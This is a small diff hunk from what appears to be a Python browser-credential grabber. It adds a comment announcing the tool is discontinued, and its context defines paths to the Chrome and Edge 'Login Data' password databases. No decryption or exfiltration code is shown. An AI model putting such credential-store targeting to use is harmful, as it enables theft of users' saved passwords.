@@ -30,6 +30,7 @@ import ctypes
 # being updated daily by war , last update by 2/28/21 at 3:57 PM
 # This is being updated and forked daily due to browser compability and etc
 # besure to keep at latest version for best performance
+# discontinued by war , lust and 2qk
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
 EBP = r'Microsoft\Edge\User Data\Default\Login Data'
